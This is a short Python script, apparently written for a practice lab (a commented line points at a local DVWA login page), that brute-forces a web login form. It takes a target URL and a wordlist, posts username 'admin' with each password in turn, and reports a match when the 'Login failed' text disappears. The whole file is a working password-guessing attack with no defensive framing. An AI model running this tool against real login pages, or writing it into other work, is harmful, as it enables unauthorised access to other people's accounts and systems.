import optparse
import requests

parser = optparse.OptionParser()
parser.add_option("-t", "--target", dest = "target", help = "Target URL.")
parser.add_option("-w", "--wordlist", dest = "wordlist", help = "Wordlist.")
(options, arguments) = parser.parse_args()

if not options.target:
    parser.error("[-] Please specify an target, use --help for more info.")
elif not options.wordlist:
    parser.error("[-] Please specify a wordlist, use --help for more info.")

#target = "http://10.0.2.5/dvwa/login.php"

data = {"username" : "admin", "password" : "pass", "Login" : "submit"}
response = requests.post(options.target, data = data)

with open(options.wordlist, "r") as wordlist:
    for line in wordlist:
        word = line.strip()
        data["password"] = word
        response = requests.post(options.target, data = data)
        if "Login failed" not in response.content:
            print("[+] Password found --> " + word)
            exit()

print("[+] Could not find the password!")
